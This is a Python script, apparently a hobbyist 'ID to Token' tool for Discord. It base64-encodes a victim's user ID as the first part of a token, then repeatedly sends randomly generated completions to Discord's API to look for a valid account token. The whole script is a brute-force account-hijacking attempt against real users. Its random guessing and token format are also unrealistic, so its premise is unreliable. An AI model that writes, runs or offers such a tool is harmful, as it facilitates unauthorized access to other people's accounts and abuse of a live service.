import base64
import random
import string
import time
import os
import requests
from colorama import Fore, init


init(autoreset=True)

def clear():
    
    os.system('cls' if os.name == 'nt' else 'clear')

clear()

ascii_art = """
                    -------------------------------------------------------------------------------------
                    | ██╗██████╗     ████████╗ ██████╗     ████████╗ ██████╗ ██╗  ██╗███████╗███╗   ██╗ |
                    | ██║██╔══██╗    ╚══██╔══╝██╔═══██╗    ╚══██╔══╝██╔═══██╗██║ ██╔╝██╔════╝████╗  ██║ |
                    | ██║██║  ██║       ██║   ██║   ██║       ██║   ██║   ██║█████╔╝ █████╗  ██╔██╗ ██║ |
                    | ██║██║  ██║       ██║   ██║   ██║       ██║   ██║   ██║██╔═██╗ ██╔══╝  ██║╚██╗██║ |
                    | ██║██████╔╝       ██║   ╚██████╔╝       ██║   ╚██████╔╝██║  ██╗███████╗██║ ╚████║ |
                    | ╚═╝╚═════╝        ╚═╝    ╚═════╝        ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝ |
                    -------------------------------------------------------------------------------------
                                                   By Tycoeur
"""

print(Fore.MAGENTA + ascii_art)

print(Fore.YELLOW + " [ENTER] USER ID : ", end="")
userid = input()


encodedBytes = base64.b64encode(userid.encode("utf-8"))
encodedStr = str(encodedBytes, "utf-8").rstrip("=")

print(Fore.GREEN + f'\n [LOGS] TOKEN FIRST PART : {encodedStr}')

def generate_random_token_part():
    
    return ''.join(random.choices(string.ascii_letters + string.digits + '-_', k=27))

def generate_discord_token():
    
    part1 = generate_random_token_part()
    part2 = generate_random_token_part()
    part3 = generate_random_token_part()
    return f"{part1}.{part2}.{part3}"

search_permission = input(Fore.YELLOW + "\n [INPUT] Do you want to search for matching tokens? (y/n): ").lower()

if search_permission == 'y':
    found = False
    attempt = 0
    start_time = time.time()
    max_duration = 20 * 60  # 20 minutes

    while not found:
        token_to_test = f"{encodedStr}.{generate_random_token_part()}.{generate_random_token_part()}"
        print(Fore.RED + f"\n [INFO] Trying token: {token_to_test}")

        headers = {
            'Authorization': token_to_test
        }

        try:
            response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)

            if response.status_code == 200:
                print(Fore.GREEN + f"\n [INFO] MATCHING TOKEN FOUND: {token_to_test}")
                print(Fore.MAGENTA + ascii_art)
                found = True
        except requests.RequestException as e:
            print(Fore.RED + f"\n [ERROR] Request failed: {e}")

        attempt += 1

        if time.time() - start_time > max_duration:
            print(Fore.RED + "\n [INFO] Time limit reached (20 minutes). Exiting the search.")
            break

        time.sleep(0.1)  

    if not found:
        print(Fore.RED + "\n [INFO] No matching token found in the given time.")
else:
    print(Fore.RED + "\n [LOGS] Search aborted.")
